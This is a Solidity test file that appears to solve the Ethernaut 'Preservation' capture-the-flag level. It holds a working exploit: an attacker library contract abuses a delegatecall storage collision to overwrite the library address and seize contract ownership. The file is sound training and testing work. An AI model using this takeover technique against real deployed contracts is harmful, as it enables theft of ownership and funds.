// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Preservation.sol";
import "../src/levels/PreservationFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestPreservation is BaseTest{
    using SafeMath for uint256;
    Preservation level;


    constructor() public{
        levelFactory = new PreservationFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = Preservation(levelAddress);   
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override{
        vm.prank(player, player);
        LibraryContract1 attackContract = new LibraryContract1();

        level.setFirstTime(uint256(address(attackContract)));
        level.setFirstTime(uint256(player));

        vm.stopPrank();
        assertEq(level.owner(), player);
    }
}

contract LibraryContract1 {
     address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        owner = address(_time);
    }
}